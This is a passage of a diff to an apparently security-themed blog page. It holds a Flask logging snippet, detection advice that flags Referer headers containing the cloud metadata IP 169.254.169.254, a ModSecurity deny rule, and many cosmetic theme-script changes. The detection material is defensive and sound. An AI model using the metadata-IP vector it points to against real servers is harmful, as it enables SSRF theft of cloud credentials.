-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check</span>():
-</span></span><span style="display:flex;"><span>    referrer <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>referrer
-</span></span><span style="display:flex;"><span>    logging<span style="color:#f92672">.</span>warning(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;API check called with referrer: </span><span style="color:#e6db74">{</span>referrer<span style="color:#e6db74">}</span><span style="color:#e6db74"> from IP: </span><span style="color:#e6db74">{</span>request<span style="color:#f92672">.</span>remote_addr<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># ...</span>
-</span></span></code></pre></div><hr>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">logging</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/api/check&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">check</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">referrer</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">referrer</span>
+</span></span><span class="line"><span class="cl">    <span class="n">logging</span><span class="o">.</span><span class="n">warning</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;API check called with referrer: </span><span class="si">{</span><span class="n">referrer</span><span class="si">}</span><span class="s2"> from IP: </span><span class="si">{</span><span class="n">request</span><span class="o">.</span><span class="n">remote_addr</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># ...</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><hr>
 <h2 id="detection-methods">Detection Methods<a hidden class="anchor" aria-hidden="true" href="#detection-methods">#</a></h2>
 <h3 id="log-analysis">Log Analysis<a hidden class="anchor" aria-hidden="true" href="#log-analysis">#</a></h3>
 <p>Look for:</p>
@@ -636,11 +1113,21 @@ Headers:
 <li>Requests with <code>Referer</code> containing cloud metadata IPs (169.254.169.254)</li>
 </ul>
 <h3 id="waf-rules">WAF Rules<a hidden class="anchor" aria-hidden="true" href="#waf-rules">#</a></h3>
-<pre tabindex="0"><code># ModSecurity rule example
-SecRule REQUEST_URI &#34;@streq /api/check&#34; \
-    &#34;chain,id:1001,phase:2,deny,status:403&#34;
-SecRule REQUEST_HEADERS:Referer &#34;!@beginsWith https://yourdomain.com&#34; 
-</code></pre><h3 id="network-monitoring">Network Monitoring<a hidden class="anchor" aria-hidden="true" href="#network-monitoring">#</a></h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># ModSecurity rule example
+</span></span><span class="line"><span class="cl">SecRule REQUEST_URI &#34;@streq /api/check&#34; \
+</span></span><span class="line"><span class="cl">    &#34;chain,id:1001,phase:2,deny,status:403&#34;
+</span></span><span class="line"><span class="cl">SecRule REQUEST_HEADERS:Referer &#34;!@beginsWith https://yourdomain.com&#34; 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="network-monitoring">Network Monitoring<a hidden class="anchor" aria-hidden="true" href="#network-monitoring">#</a></h3>
 <ul>
 <li>Outbound connections from the application server to unexpected destinations</li>
 <li>DNS queries for internal hostnames or IP addresses</li>
@@ -695,442 +1182,355 @@ SecRule REQUEST_HEADERS:Referer &#34;!@beginsWith https://yourdomain.com&#34;
     <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
         <path d="M12 6H0l6-6z" />
     </svg>
-</a><canvas id="matrix-bg"></canvas>
+</a><div id="three-container" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -9999; background: #000;"></div>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+<script>
+    let scene, camera, renderer, networkGroup;
+    let mouseX = 0, mouseY = 0;
+    const container = document.getElementById('three-container');
+    const windowHalfX = window.innerWidth / 2;
+    const windowHalfY = window.innerHeight / 2;
+
+    function initThreeJS() {
+        if (!container) return;
+        scene = new THREE.Scene();
+        scene.fog = new THREE.FogExp2(0x000000, 0.0015);
+        camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 1, 2000);
+        camera.position.z = 1000;
+        renderer = new THREE.WebGLRenderer({ antialias: true, alpha: true });
+        renderer.setPixelRatio(window.devicePixelRatio);
+        renderer.setSize(window.innerWidth, window.innerHeight);
+        renderer.setClearColor(0x000000, 1);
+        container.innerHTML = ''; 
+        container.appendChild(renderer.domElement);
+        networkGroup = new THREE.Group();
+        scene.add(networkGroup);
+        
+        const geometry = new THREE.BoxGeometry(40, 40, 40);
+        const material = new THREE.MeshBasicMaterial({ color: 0x00ff41, wireframe: true, transparent: true, opacity: 0.5, side: THREE.DoubleSide });
+        
+        for (let i = 0; i < 200; i++) {
+            const mesh = new THREE.Mesh(geometry, material);
+            mesh.position.x = (Math.random() - 0.5) * 2000;
+            mesh.position.y = (Math.random() - 0.5) * 2000;
+            mesh.position.z = (Math.random() - 0.5) * 2000;
+            mesh.rotation.x = Math.random() * 2 * Math.PI;
+            mesh.rotation.y = Math.random() * 2 * Math.PI;
+            mesh.scale.set(Math.random() * 2 + 0.5, Math.random() * 2 + 0.5, Math.random() * 2 + 0.5);
+            networkGroup.add(mesh);
+        }
+
+        const lineMaterial = new THREE.LineBasicMaterial({ color: 0x00ff41, transparent: true, opacity: 0.2 });
+        const lineGeometry = new THREE.BufferGeometry();
+        const positions = [];
+        const blocks = networkGroup.children;
+
+        for (let i = 0; i < blocks.length; i++) {
+            for (let j = i + 1; j < blocks.length; j++) {
+                const dist = blocks[i].position.distanceTo(blocks[j].position);
+                if (dist < 300) {
+                    positions.push(blocks[i].position.x, blocks[i].position.y, blocks[i].position.z);
+                    positions.push(blocks[j].position.x, blocks[j].position.y, blocks[j].position.z);
+                }
+            }
+        }
+        lineGeometry.setAttribute('position', new THREE.Float32BufferAttribute(positions, 3));
+        const lines = new THREE.LineSegments(lineGeometry, lineMaterial);
+        networkGroup.add(lines);
+
+        document.addEventListener('mousemove', onDocumentMouseMove, false);
+        window.addEventListener('resize', onWindowResize, false);
+    }
+
+    function onWindowResize() { camera.aspect = window.innerWidth / window.innerHeight; camera.updateProjectionMatrix(); renderer.setSize(window.innerWidth, window.innerHeight); }
+    function onDocumentMouseMove(event) { mouseX = (event.clientX - windowHalfX) * 0.5; mouseY = (event.clientY - windowHalfY) * 0.5; }
+    function animateThreeJS() { requestAnimationFrame(animateThreeJS); render(); }
+    function render() {
+        const time = Date.now() * 0.0005;
+        camera.position.x += (mouseX - camera.position.x) * 0.05;
+        camera.position.y += (-mouseY - camera.position.y) * 0.05;
+        camera.lookAt(scene.position);
+        networkGroup.rotation.x = time * 0.2;
+        networkGroup.rotation.y = time * 0.3;
+        renderer.render(scene, camera);
+    }
+    
+    if(!window.threeInitialized) { initThreeJS(); animateThreeJS(); window.threeInitialized = true; }
+</script>
+
+
+<div id="cyber-back-btn" style="display: none;" onclick="goBack()">
+    <span class="cmd">&lt;</span> <span class="text">RETURN</span>
+</div>
+
+<div id="hackmd-toc-wrapper" style="display: none;">
+    <div class="toc-header">:: TABLE OF CONTENTS ::</div>
+    <div id="hackmd-toc-content"></div>
+</div>
+
+<script>
+    
+    function goBack() {
+        
+        if (window.history.length > 1 && document.referrer.indexOf(window.location.host) !== -1) {
+            window.history.back();
+        } else {
+            window.location.href = '/'; 
+        }
+    }
+
+    
+    function generateHackMDTOC() {
+        const tocWrapper = document.getElementById('hackmd-toc-wrapper');
+        const tocContent = document.getElementById('hackmd-toc-content');
+        const backBtn = document.getElementById('cyber-back-btn');
+        const postContent = document.querySelector('.post-content');
+
+        
+        if(tocContent) tocContent.innerHTML = '';
+        if(tocWrapper) tocWrapper.style.display = 'none';
+        if(backBtn) backBtn.style.display = 'none';
+
+        
+        if (postContent && tocContent) {
+            
+            if(backBtn) backBtn.style.display = 'block';
+
+            
+            const headings = postContent.querySelectorAll('h1, h2, h3, h4');
+            if (headings.length > 0) {
+                tocWrapper.style.display = 'block';
+                const ul = document.createElement('ul');
+
+                headings.forEach((heading) => {
+                    let id = heading.getAttribute('id');
+                    if (!id) {
+                        id = heading.innerText.toLowerCase().replace(/[^\w]+/g, '-');
+                        heading.setAttribute('id', id);
+                    }
+
+                    const li = document.createElement('li');
+                    const level = heading.tagName.toLowerCase();
+                    li.className = `toc-item ${level}`;
+
+                    const a = document.createElement('a');
+                    a.href = `#${id}`;
+                    a.innerText = heading.innerText;
+                    a.className = 'toc-link';
+                    
+                    a.addEventListener('click', (e) => {
+                        e.preventDefault();
+                        const target = document.getElementById(id);
+                        if(target) {
+                            const offsetPosition = target.getBoundingClientRect().top + window.pageYOffset - 100;
+                            window.scrollTo({ top: offsetPosition, behavior: "smooth" });
+                            history.pushState(null, null, `#${id}`);
+                        }
+                    });
+
+                    li.appendChild(a);
+                    ul.appendChild(li);
+                });
+                tocContent.appendChild(ul);
+
+                
+                const observer = new IntersectionObserver(entries => {
+                    entries.forEach(entry => {
+                        if (entry.isIntersecting) {
+                            const id = entry.target.getAttribute('id');
+                            document.querySelectorAll('.toc-link').forEach(link => link.classList.remove('active'));
+                            const activeLink = document.querySelector(`.toc-link[href="#${id}"]`);
+                            if (activeLink) {
+                                activeLink.classList.add('active');
+                                activeLink.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+                            }
+                        }
+                    });
+                }, { rootMargin: '-100px 0px -70% 0px' });
+                headings.forEach(heading => observer.observe(heading));
+            }
+        }
+    }
+</script>
+
 <style>
      
-    #matrix-bg {
+    #cyber-back-btn {
         position: fixed;
-        top: 0; left: 0;
-        width: 100vw; height: 100vh;
-        z-index: -9999;  
-        pointer-events: none;
+        left: 20px;
+        top: 130px;  
+        width: 260px;  
+        padding: 10px 15px;
+        box-sizing: border-box;
+        
+        background: rgba(0, 0, 0, 0.8);
+        border: 1px solid #00ff41;
+        border-left: 5px solid #00ff41;  
+        color: #00ff41;
+        
+        font-family: 'Courier New', monospace;
+        font-weight: bold;
+        font-size: 14px;
+        cursor: pointer;
+        z-index: 95;
+        transition: all 0.3s ease;
+        backdrop-filter: blur(5px);
+        
+        text-transform: uppercase;
+        letter-spacing: 1px;
     }
+
+    #cyber-back-btn:hover {
+        background: rgba(0, 255, 65, 0.2);
+        box-shadow: 0 0 15px rgba(0, 255, 65, 0.4);
+        padding-left: 25px;  
+    }
+    
+    #cyber-back-btn .cmd { opacity: 0.7; margin-right: 5px; }
 
      
-    .emoji-reset {
-        font-family: "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji", "Android Emoji", sans-serif !important;
-        color: initial !important; 
-        background: none !important; 
-        -webkit-text-fill-color: initial !important; 
-        -webkit-background-clip: border-box !important;
-        text-shadow: none !important; 
-        font-style: normal !important;
-        display: inline-block !important;
-        font-weight: normal !important;
+    #hackmd-toc-wrapper {
+        position: fixed;
+        left: 20px;
+        top: 180px;  
+        width: 260px;
+        max-height: calc(100vh - 200px);
+        overflow-y: auto;
+        z-index: 90;
+        background: transparent;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+        padding-right: 10px;
+    }
+
+    .toc-header {
+        font-family: 'Courier New', monospace;
+        font-size: 11px; font-weight: bold; color: #00ff41;
+        margin-bottom: 15px; border-bottom: 1px solid rgba(0, 255, 65, 0.3);
+        padding-bottom: 5px; opacity: 0.8;
+    }
+    #hackmd-toc-content ul { list-style: none; padding: 0; margin: 0; border-left: 2px solid rgba(255, 255, 255, 0.1); }
+    #hackmd-toc-content li { margin: 0; position: relative; }
+    .toc-link { display: block; text-decoration: none; color: #888; font-size: 13px; padding: 5px 0 5px 15px; line-height: 1.5; transition: all 0.2s ease; border-left: 2px solid transparent; margin-left: -2px; }
+    .toc-link:hover { color: #fff; }
+    .toc-link.active { color: #00ff41 !important; font-weight: 500; border-left: 2px solid #00ff41; background: linear-gradient(90deg, rgba(0, 255, 65, 0.05), transparent); }
+    .toc-item.h1 { padding-left: 0; } .toc-item.h1 .toc-link { font-weight: bold; font-size: 14px; color: #ccc; }
+    .toc-item.h2 { padding-left: 0; }
+    .toc-item.h3 .toc-link { padding-left: 30px; font-size: 12px; }
+    .toc-item.h4 .toc-link { padding-left: 45px; font-size: 11px; opacity: 0.8; }
+    #hackmd-toc-wrapper::-webkit-scrollbar { width: 3px; }
+    #hackmd-toc-wrapper::-webkit-scrollbar-thumb { background: #333; }
+
+     
+    @media screen and (max-width: 1450px) {
+        #hackmd-toc-wrapper, #cyber-back-btn { display: none !important; }
     }
 </style>
-<script>
-    
-    const canvas = document.getElementById('matrix-bg');
-    const ctx = canvas.getContext('2d');
 
-    function resizeCanvas() {
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
+
+<style>
+    .post-single {
+        background-color: rgba(0, 0, 0, 0.85) !important;
+        backdrop-filter: blur(10px);
+        border: 1px solid #00ff41;
+        border-radius: 12px;
+        padding: 40px;
+        margin-top: 20px;
+        box-shadow: 0 0 30px rgba(0, 255, 65, 0.15);
+        position: relative;
+        z-index: 1;
     }
-    window.addEventListener('resize', resizeCanvas);
-    resizeCanvas();
-
-    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*';
-    const fontSize = 14;
-    const columns = Math.ceil(window.innerWidth / fontSize);
-    const drops = Array(columns).fill(1);
-
-    function draw() {
-        ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
-        ctx.fillRect(0, 0, canvas.width, canvas.height);
-        ctx.fillStyle = 'rgba(0, 255, 65, 0.15)'; 
-        ctx.font = fontSize + 'px monospace';
-
-        for (let i = 0; i < drops.length; i++) {
-            const text = chars.charAt(Math.floor(Math.random() * chars.length));
-            ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
-                drops[i] = 0;
-            }
-            drops[i]++;
+    @media screen and (min-width: 1451px) {
+        .post-single {
+            margin-left: 300px !important;
+            width: calc(100% - 300px) !important;
+            max-width: 1000px;
         }
+        .main { max-width: 1600px !important; margin: auto; }
     }
-    
-    ctx.fillStyle = '#000000';
-    ctx.fillRect(0, 0, canvas.width, canvas.height);
-    setInterval(draw, 35);
-
-    
-    document.addEventListener("DOMContentLoaded", function() {
-        function rescueEmojis(node) {
-            if (node.nodeType === 3) { 
-                const text = node.nodeValue;
-                const emojiRegex = /[\p{Emoji_Presentation}\p{Extended_Pictographic}\u{1F300}-\u{1F6FF}\u{1F900}-\u{1F9FF}\u{2600}-\u{26FF}\u{2700}-\u{27BF}]/gu;
-                if (text.match(emojiRegex)) {
-                    const span = document.createElement('span');
-                    span.innerHTML = text.replace(emojiRegex, '<span class="emoji-reset">$&</span>');
-                    node.parentNode.replaceChild(span, node);
-                }
-            } 
-            else if (node.nodeType === 1 && !['SCRIPT', 'STYLE', 'TEXTAREA', 'CODE', 'PRE'].includes(node.tagName) && !node.classList.contains('emoji-reset')) {
-                Array.from(node.childNodes).forEach(child => rescueEmojis(child));
-            }
-        }
-        rescueEmojis(document.body);
-    });
-</script>
+    .post-content { color: #e0e0e0; }
+    .post-content pre { border: 1px solid rgba(0, 255, 65, 0.4); background: #0d1117 !important; }
+</style>
 
 
-<canvas id="fireworks" style="position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:99999;"></canvas>
 <script>
-    
-    (function() {
-        if(!window.anime) {
-            var script = document.createElement('script');
-            script.src = "https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js";
-            script.onload = initFireworks;
-            document.head.appendChild(script);
-        } else { initFireworks(); }
-    })();
-
-    function initFireworks() {
-        const fireworkCanvas = document.getElementById('fireworks');
-        const fwCtx = fireworkCanvas.getContext('2d');
-        let fwWidth = window.innerWidth;
-        let fwHeight = window.innerHeight;
-        fireworkCanvas.width = fwWidth;
-        fireworkCanvas.height = fwHeight;
-
-        window.addEventListener('resize', () => {
-            fwWidth = window.innerWidth;
-            fwHeight = window.innerHeight;
-            fireworkCanvas.width = fwWidth;
-            fireworkCanvas.height = fwHeight;
-        });
-
-        function createParticle(x, y) {
-            const particle = {};
-            particle.x = x;
-            particle.y = y;
-            const colors = ['#00ff41', '#008F11', '#ffffff'];
-            particle.color = colors[Math.floor(Math.random() * colors.length)];
-            particle.radius = Math.random() * 2 + 1;
-            const angle = Math.random() * Math.PI * 2;
-            const velocity = Math.random() * 6 + 2;
-            particle.vx = Math.cos(angle) * velocity;
-            particle.vy = Math.sin(angle) * velocity;
-            particle.life = 100; 
-            return particle;
-        }
-
-        let particles = [];
-
-        function animateFireworks() {
-            requestAnimationFrame(animateFireworks);
-            fwCtx.clearRect(0, 0, fwWidth, fwHeight);
-            for (let i = 0; i < particles.length; i++) {
-                const p = particles[i];
-                fwCtx.beginPath();
-                fwCtx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
-                fwCtx.fillStyle = p.color;
-                fwCtx.globalAlpha = p.life / 100;
-                fwCtx.fill();
-                fwCtx.globalAlpha = 1;
-                p.x += p.vx;
-                p.y += p.vy;
-                p.life--;
-                if (p.life <= 0) {
-                    particles.splice(i, 1);
-                    i--;
-                }
+    function initStatusBar() {
+        if (document.getElementById('system-status-bar')) return;
+        const header = document.querySelector('.header') || document.querySelector('header');
+        if (header) {
+            const statusBar = document.createElement('div');
+            statusBar.id = 'system-status-bar';
+            statusBar.innerHTML = `
+                <div class="status-content">
+                    <div class="status-item"><span class="label">SYSTEM:</span> <span class="value">ONLINE</span></div>
+                    <div class="status-clock"><span id="sb-hour">00</span><span class="blink">:</span><span id="sb-min">00</span><span class="blink">:</span><span id="sb-sec">00</span></div>
+                    <div class="status-item"><span class="label">DATE:</span> <span class="value" id="sb-date">LOADING...</span></div>
+                </div>`;
+            header.parentNode.insertBefore(statusBar, header.nextSibling);
+            function updateTime() {
+                const now = new Date();
+                const hEl = document.getElementById('sb-hour'), mEl = document.getElementById('sb-min'), sEl = document.getElementById('sb-sec'), dEl = document.getElementById('sb-date');
+                if(hEl) { hEl.innerText = String(now.getHours()).padStart(2, '0'); mEl.innerText = String(now.getMinutes()).padStart(2, '0'); sEl.innerText = String(now.getSeconds()).padStart(2, '0'); }
+                if(dEl) { dEl.innerText = now.toLocaleDateString('en-CA'); }
             }
+            setInterval(updateTime, 1000); updateTime();
         }
-        animateFireworks();
-
-        document.addEventListener('mousedown', (e) => {
-            if(e.button === 0) { 
-                for (let i = 0; i < 30; i++) {
-                    particles.push(createParticle(e.clientX, e.clientY));
-                }
-            }
-        });
     }
 </script>
+<style>
+    #system-status-bar { width: 100%; background-color: rgba(0, 10, 0, 0.85); border-bottom: 1px solid #00ff41; border-top: 1px solid rgba(0, 255, 65, 0.2); padding: 10px 0; margin-bottom: 30px; font-family: 'Courier New', monospace; backdrop-filter: blur(5px); position: relative; z-index: 99; }
+    .status-content { max-width: 1200px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; padding: 0 20px; }
+    .status-item { font-size: 0.9rem; color: #00ff41; opacity: 0.8; } .status-item .label { font-weight: bold; color: #fff; }
+    .status-clock { font-size: 1.8rem; font-weight: 800; color: #00ff41; text-shadow: 0 0 15px rgba(0, 255, 65, 0.6); letter-spacing: 3px; background: rgba(0, 255, 65, 0.05); padding: 5px 20px; border-radius: 5px; border: 1px dashed rgba(0, 255, 65, 0.3); }
+    .blink { animation: blink-anim 1s infinite; } @keyframes blink-anim { 0%, 100% { opacity: 1; } 50% { opacity: 0.2; } }
+    @media screen and (max-width: 768px) { .status-content { flex-direction: column; gap: 5px; } .status-clock { font-size: 1.4rem; width: 100%; text-align: center; box-sizing: border-box; } }
+</style>
 
+
+<style>
+    .profile img { border-radius: 50% !important; border: 3px solid #00ff41 !important; box-shadow: 0 0 25px rgba(0, 255, 65, 0.4) !important; background: #000; transition: transform 0.3s ease; }
+    .profile img:hover { transform: scale(1.05) rotate(5deg); box-shadow: 0 0 50px rgba(0, 255, 65, 0.9) !important; }
+    .art-widget, .cyber-panel, .avatar-wrapper-hud { display: none !important; }
+</style>
 
 <script src="https://cdn.jsdelivr.net/npm/pjax/pjax.js"></script>
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
 <script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
-
-<div id="aplayer-fixed" class="hacker-player"></div>
+<div id="aplayer-fixed"></div>
 
 <script>
-    document.addEventListener('DOMContentLoaded', () => {
-        
-        var pjax = new Pjax({
-            selectors: [
-                "title", 
-                "meta[name=description]", 
-                "main", 
-            ],
-            cacheBust: false
-        });
+    function initAllWidgets() {
+        initStatusBar();
+        generateHackMDTOC();
+    }
 
-        
+    document.addEventListener('DOMContentLoaded', () => {
+        var pjax = new Pjax({ selectors: ["title", "meta[name=description]", "main"], cacheBust: false });
         if (!window.ap) {
             window.ap = new APlayer({
-                container: document.getElementById('aplayer-fixed'),
-                fixed: true,
-                autoplay: true,
-                theme: '#00ff41',
-                loop: 'all',
-                order: 'list',
-                preload: 'auto',
-                volume: 0.5,
-                mutex: true,
-                listFolded: true,
-                audio: [
-                    
-                    {
-                        name: 'Người tình mùa đông',
-                        artist: 'Hà Anh Tuấn',
-                        url: 'music/nhac.mp3', 
-                        cover: 'images/cover.png'
-                    },
-                    
-                ]
+                container: document.getElementById('aplayer-fixed'), fixed: true, autoplay: true, theme: '#00ff41', loop: 'all', order: 'list', preload: 'auto', volume: 0.5, mutex: true, listFolded: true,
+                audio: [ { name: 'Cyberpunk City', artist: 'Hacker', url: '/music/song.mp3', cover: '/images/cover.jpg' } ]
             });
-
-            
-            document.body.addEventListener('click', function() {
-                window.ap.play();
-            }, { once: true });
+            document.body.addEventListener('click', function() { window.ap.play(); }, { once: true });
         }
-        
-        
-        initCyberClock();
+        initAllWidgets();
     });
 
-    
-    
     document.addEventListener('pjax:complete', function() {
-        initCyberClock();
+        initAllWidgets();
     });
 </script>
-
 <style>
-     
     .aplayer { background: rgba(0, 0, 0, 0.9) !important; border: 1px solid #00ff41 !important; box-shadow: 0 0 10px rgba(0, 255, 65, 0.2) !important; color: #00ff41 !important; font-family: 'Courier New', monospace !important; z-index: 99999 !important; }
     .aplayer .aplayer-info .aplayer-music .aplayer-title { color: #00ff41 !important; }
     .aplayer .aplayer-info .aplayer-music .aplayer-author { color: #008f11 !important; }
     .aplayer .aplayer-lrc { display: none !important; }
     .aplayer .aplayer-bar-wrap .aplayer-bar { background: #333 !important; }
-    .aplayer .aplayer-bar-wrap .aplayer-bar .aplayer-loaded { background: #555 !important; }
     .aplayer .aplayer-bar-wrap .aplayer-bar .aplayer-played { background: #00ff41 !important; box-shadow: 0 0 10px #00ff41; }
-    .aplayer .aplayer-bar-wrap .aplayer-bar .aplayer-played .aplayer-thumb { background: #00ff41 !important; border: 2px solid #000 !important; }
-    .aplayer .aplayer-pic .aplayer-button { background: rgba(0,0,0,0.5) !important; border: 1px solid #00ff41 !important; }
-    .aplayer .aplayer-pic .aplayer-button path { fill: #00ff41 !important; }
-    .aplayer-list { background: #000000 !important; border-top: 1px solid #00ff41 !important; }
+    .aplayer .aplayer-bar-wrap .aplayer-bar .aplayer-played .aplayer-thumb { background: #00ff41 !important; border: 1px solid #000 !important; }
+    .aplayer-list { background: #000 !important; border-top: 1px solid #00ff41 !important; }
     .aplayer-list ol li { border-bottom: 1px dashed #333 !important; }
     .aplayer-list ol li:hover { background: rgba(0, 255, 65, 0.1) !important; }
-    .aplayer-list ol li.aplayer-list-light { background: rgba(0, 255, 65, 0.2) !important; }
-    .aplayer-list ol li .aplayer-list-title { color: #00ff41 !important; }
-    .aplayer-list ol li .aplayer-list-index { color: #00ff41 !important; }
-    .aplayer-list ol li .aplayer-list-author { color: #008f11 !important; }
 </style>
-
-
-<script>
-    function initCyberClock() {
-        
-        if (document.getElementById('cyber-clock-container')) return;
-
-        
-        const navMenu = document.querySelector('.nav') || document.querySelector('nav');
-        
-        if (navMenu) {
-            
-            const clockDiv = document.createElement('div');
-            clockDiv.id = 'cyber-clock-container';
-            clockDiv.innerHTML = `
-                <div class="cyber-time">
-                    <span id="cyber-hours">00</span><span class="blink">:</span><span id="cyber-minutes">00</span><span class="blink">:</span><span id="cyber-seconds">00</span>
-                </div>
-                <div class="cyber-date" id="cyber-date">YYYY-MM-DD</div>
-            `;
-            
-            
-            navMenu.appendChild(clockDiv);
-            
-            
-            function updateTime() {
-                const now = new Date();
-                
-                const h = String(now.getHours()).padStart(2, '0');
-                const m = String(now.getMinutes()).padStart(2, '0');
-                const s = String(now.getSeconds()).padStart(2, '0');
-                
-                const year = now.getFullYear();
-                const month = String(now.getMonth() + 1).padStart(2, '0');
-                const day = String(now.getDate()).padStart(2, '0');
-                
-                const hEl = document.getElementById('cyber-hours');
-                const mEl = document.getElementById('cyber-minutes');
-                const sEl = document.getElementById('cyber-seconds');
-                const dEl = document.getElementById('cyber-date');
-                
-                if(hEl && mEl && sEl && dEl) {
-                    hEl.innerText = h;
-                    mEl.innerText = m;
-                    sEl.innerText = s;
-                    dEl.innerText = `-- ${year}-${month}-${day} --`;
-                }
-            }
-            
-            setInterval(updateTime, 1000);
-            updateTime(); 
-        }
-    }
-</script>
-
-<style>
-     
-    #cyber-clock-container {
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        justify-content: center;
-        margin-top: 15px;
-        padding: 5px;
-        font-family: 'Courier New', monospace;
-        color: #00ff41;
-        text-shadow: 0 0 5px #00ff41;
-        border-top: 1px dashed rgba(0, 255, 65, 0.3);
-        
-         
-        width: 100%; 
-        order: 999;  
-    }
-
-    .cyber-time {
-        font-size: 2.5em;
-        font-weight: bold;
-        letter-spacing: 2px;
-    }
-
-    .cyber-date {
-        font-size: 1.5em;
-        opacity: 0.8;
-        letter-spacing: 1px;
-    }
-
-     
-    .blink {
-        animation: blink-anim 1s infinite;
-    }
-
-    @keyframes blink-anim {
-        0%, 100% { opacity: 1; }
-        50% { opacity: 0; }
-    }
-    
-     
-    @media screen and (max-width: 480px) {
-        #cyber-clock-container {
-            font-size: 0.8em;
-        }
-    }
-</style>
-
-<script>
-    document.addEventListener("DOMContentLoaded", function() {
-        
-        const profileImg = document.querySelector('.profile img');
-        
-        
-        if (profileImg && !document.querySelector('.avatar-wrapper-hud')) {
-            
-            
-            const wrapper = document.createElement('div');
-            wrapper.className = 'avatar-wrapper-hud';
-            
-            
-            const leftDeco = document.createElement('div');
-            leftDeco.className = 'avatar-deco deco-left';
-            leftDeco.innerHTML = `
-                <div class="hud-text">:: BIO-SCAN ::</div>
-                <div class="hud-anim-box">
-                    <div class="scan-line"></div>
-                    <div class="data-row">ID: P1C0L0</div>
-                    <div class="data-row">STATUS: ONLINE</div>
-                </div>
-            `;
-            
-            
-            const rightDeco = document.createElement('div');
-            rightDeco.className = 'avatar-deco deco-right';
-            rightDeco.innerHTML = `
-                <div class="hud-text">:: SYS-ANALYSIS ::</div>
-                <div class="hud-anim-box">
-                    <div class="scan-line delay"></div>
-                    <div class="data-row align-right">THREAT: NONE</div>
-                    <div class="data-row align-right">ACCESS: GRANTED</div>
-                </div>
-            `;
-            
-            
-            
-            profileImg.parentNode.insertBefore(wrapper, profileImg);
-            
-            wrapper.appendChild(leftDeco);
-            wrapper.appendChild(profileImg); 
-            wrapper.appendChild(rightDeco);
-        }
-    });
-</script>
-
-<script>
-    document.addEventListener("DOMContentLoaded", function() {
-        
-        const profileImg = document.querySelector('.profile img');
-        
-        
-        if (profileImg && !document.querySelector('.avatar-wrapper-hud')) {
-            
-            
-            const wrapper = document.createElement('div');
-            wrapper.className = 'avatar-wrapper-hud';
-            
-            
-            const leftDeco = document.createElement('div');
-            leftDeco.className = 'avatar-deco deco-left';
-            leftDeco.innerHTML = `
-                <div class="hud-text">:: BIO-SCAN ::</div>
-                <div class="hud-anim-box">
-                    <div class="scan-line"></div>
-                    <div class="data-row">ID: P1C0L0</div>
-                    <div class="data-row">STATUS: ONLINE</div>
-                </div>
-            `;
-            
-            
-            const rightDeco = document.createElement('div');
-            rightDeco.className = 'avatar-deco deco-right';
-            rightDeco.innerHTML = `
-                <div class="hud-text">:: SYS-ANALYSIS ::</div>
-                <div class="hud-anim-box">
-                    <div class="scan-line delay"></div>
-                    <div class="data-row align-right">THREAT: NONE</div>
-                    <div class="data-row align-right">ACCESS: GRANTED</div>
-                </div>
-            `;
-            
-            
-            
-            profileImg.parentNode.insertBefore(wrapper, profileImg);
-            
-            wrapper.appendChild(leftDeco);
-            wrapper.appendChild(profileImg); 
-            wrapper.appendChild(rightDeco);
-        }
-    });
-</script>
 
 <script>
     let menu = document.getElementById('menu');
